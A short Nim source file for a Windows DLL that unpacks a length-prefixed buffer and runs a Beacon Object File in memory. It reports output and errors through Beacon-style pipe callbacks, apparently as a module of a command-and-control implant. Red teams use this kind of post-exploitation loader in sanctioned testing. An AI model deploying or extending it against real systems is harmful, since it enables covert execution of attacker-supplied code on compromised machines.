import winim/lean
import ./[beacon, coff]

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL
             {.stdcall, exportc, dynlib.} =
    return TRUE

proc parseArguments(args: PBYTE, argsLen: DWORD): tuple[obj: PBYTE, objLen: DWORD, objArgs: PBYTE, objArgsLen: DWORD] =
    if args == nil or argsLen < 8:
        return

    let bofLen = cast[ptr uint32](args)[]
    if argsLen < cast[DWORD](4 + bofLen + 4):
        return

    let bofArgsLen = cast[ptr uint32](cast[uint](args) + 4 + bofLen)[]
    if argsLen < cast[DWORD](4 + bofLen + 4 + bofArgsLen):
        return

    result.obj = cast[PBYTE](cast[uint](args) + 4)
    result.objLen = cast[DWORD](bofLen)
    result.objArgs = cast[PBYTE](cast[uint](args) + 4 + bofLen + 4)
    result.objArgsLen = cast[DWORD](bofArgsLen)

proc Run(args: PBYTE, argsLen: DWORD, hWrite, hWakeup, hStop: HANDLE): BOOL {.stdcall, exportc, dynlib.} =
    NimMain()

    gOutputPipe = hWrite
    gWakeupEvent = hWakeup
    gStopEvent = hStop

    let (obj, objLen, objArgs, objArgsLen) = parseArguments(args, argsLen)
    try:
        inlineExecute(obj, objLen, objArgs, objArgsLen)
    
    except CatchableError as err:
        # Write error message to pipe and wakeup agent
        BeaconPrintf(CALLBACK_ERROR, err.msg)
        BeaconWakeup()
        return FALSE

    # Flush pipe buffer 
    BeaconWakeup()
    return TRUE
